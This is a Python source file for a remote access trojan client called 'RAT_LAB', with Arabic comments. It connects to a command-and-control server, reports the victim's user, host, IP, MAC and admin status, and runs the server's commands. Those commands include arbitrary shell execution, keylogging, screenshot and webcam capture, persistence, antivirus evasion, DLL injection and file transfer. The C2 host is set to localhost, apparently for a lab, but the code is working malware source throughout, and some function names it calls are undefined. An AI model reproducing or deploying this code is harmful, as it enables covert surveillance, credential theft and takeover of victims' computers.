#!/usr/bin/env python3
# RAT_LAB Client - Enhanced Version

import socket
import json
import threading
import time
import os
import sys
import base64
import hashlib
import subprocess
import platform
import psutil
import uuid
import winreg
import ctypes
from datetime import datetime

# استيراد المودولات
from modules.evasion import run_evasion_suite
from modules.injection import auto_inject, inject_dll
from modules.keylogger import KeyLogger
from modules.screenshot import capture as capture_screenshot
from modules.webcam import capture as capture_webcam
from modules.fileops import search_files as search_files_func, list_directory, read_file, write_file, download_file, upload_file
from modules.persistence import install_all as establish_persistence
from modules.shell import RemoteShell

class RAT_Client:
    def __init__(self, c2_host, c2_port=4444):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.client_id = self.generate_client_id()
        self.running = True
        self.keylogger_active = False
        self.evasion_results = None
        
    def generate_client_id(self):
        """إنشاء معرف فريد للعميل"""
        return f"{platform.system()}_{uuid.getnode()}_{int(time.time())}"
        
    def connect_to_c2(self):
        """الاتصال بخادم C2"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_host, self.c2_port))
            
            # إرسال معلومات العميل
            self.send_info()
            return True
            
        except Exception as e:
            print(f"فشل الاتصال: {e}")
            return False
            
    def send_info(self):
        """إرسال معلومات النظام"""
        info = {
            "type": "info",
            "client_id": self.client_id,
            "data": {
                "os": platform.system(),
                "os_version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "user": os.getenv('USERNAME', 'unknown'),
                "computer_name": os.getenv('COMPUTERNAME', 'unknown'),
                "ip_address": self.get_local_ip(),
                "mac_address": self.get_mac_address(),
                "admin": self.is_admin(),
                "timestamp": datetime.now().isoformat()
            }
        }
        self.send_message(info)
        
    def get_local_ip(self):
        """الحصول على عنوان IP المحلي"""
        try:
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except:
            return "unknown"
            
    def get_mac_address(self):
        """الحصول على عنوان MAC"""
        try:
            mac = uuid.getnode()
            return ':'.join(f'{(mac >> i) & 0xFF:02x}' for i in range(40, -1, -8))
        except:
            return "unknown"
            
    def is_admin(self):
        """التحقق من صلاحيات المسؤول"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
            
    def send_message(self, message):
        """إرسال رسالة للخادم"""
        try:
            data = json.dumps(message).encode()
            self.socket.send(data)
        except:
            pass
            
    def receive_messages(self):
        """استلام الرسائل من الخادم"""
        while self.running:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break
                    
                message = json.loads(data.decode())
                self.process_command(message)
                
            except Exception as e:
                break
                
    def process_command(self, message):
        """معالجة الأمر المستلم"""
        cmd_type = message.get("type", "")
        command = message.get("command", "")
        
        if cmd_type == "command":
            result = self.execute_command(command)
            
            # إرسال النتيجة
            response = {
                "type": "output",
                "client_id": self.client_id,
                "command": command,
                "output": result,
                "timestamp": datetime.now().isoformat()
            }
            self.send_message(response)
            
    def execute_command(self, command):
        """تنفيذ الأمر"""
        try:
            if command == "shell":
                return "Shell mode activated. Use 'exit' to quit."
                
            elif command == "screenshot":
                filename = f"screenshot_{int(time.time())}.png"
                capture_screenshot(filename)
                return f"تم التقاط لقطة شاشة: {filename}"
                
            elif command == "keylogger":
                if not self.keylogger_active:
                    threading.Thread(target=self.start_keylogger_thread, daemon=True).start()
                    self.keylogger_active = True
                    return "تم تفعيل Keylogger"
                else:
                    return "Keylogger نشط بالفعل"
                    
            elif command == "webcam":
                filename = f"webcam_{int(time.time())}.jpg"
                capture_webcam(filename)
                return f"تم التقاط صورة من الكاميرا: {filename}"
                
            elif command == "persistence":
                establish_persistence()
                return "تم تثبيت الاستمرارية"
                
            elif command == "evasion":
                self.evasion_results = run_evasion_suite()
                return f"تم تشغيل مجموعة التهرب: {self.evasion_results}"
                
            elif command.startswith("inject "):
                # حقن DLL
                dll_path = command[7:].strip()
                result = inject_dll(os.getpid(), dll_path)
                return f"نتيجة الحقن: {result}"
                
            elif command.startswith("search "):
                # البحث عن ملفات
                pattern = command[7:].strip()
                results = search_files_func(pattern)
                return f"تم العثور على {len(results)} ملفات"
                
            elif command.startswith("download "):
                # تحميل ملف
                filepath = command[9:].strip()
                return download_file_func(filepath)
                
            elif command.startswith("upload "):
                # رفع ملف
                filepath = command[7:].strip()
                return upload_file_func(filepath)
                
            else:
                # تنفيذ أمر shell عادي
                shell = RemoteShell()
                return shell.execute(command)
                
        except Exception as e:
            return f"خطأ: {str(e)}"
            
    def start_keylogger_thread(self):
        """بدء Keylogger في خيط منفصل"""
        try:
            kl = KeyLogger()
            kl.start()
        except Exception as e:
            print(f"خطأ في Keylogger: {e}")
            
    def run(self):
        """تشغيل العميل"""
        # تشغيل مجموعة التهرب
        print("جاري تشغيل مجموعة التهرب...")
        self.evasion_results = run_evasion_suite()
        
        # الاتصال بالخادم
        if self.connect_to_c2():
            print(f"تم الاتصال بالخادم: {self.c2_host}:{self.c2_port}")
            
            # بدء استلام الرسائل
            receive_thread = threading.Thread(target=self.receive_messages)
            receive_thread.daemon = True
            receive_thread.start()
            
            # الحفاظ على الاتصال
            while self.running:
                time.sleep(30)
                # إرسال نبضة heartbeat
                heartbeat = {
                    "type": "heartbeat",
                    "client_id": self.client_id,
                    "timestamp": datetime.now().isoformat()
                }
                self.send_message(heartbeat)
                
        else:
            print("فشل الاتصال بالخادم")

if __name__ == "__main__":
    # قراءة الإعدادات من ملف
    c2_host = "127.0.0.1"  # localhost
    c2_port = 4444
    
    client = RAT_Client(c2_host, c2_port)
    client.run()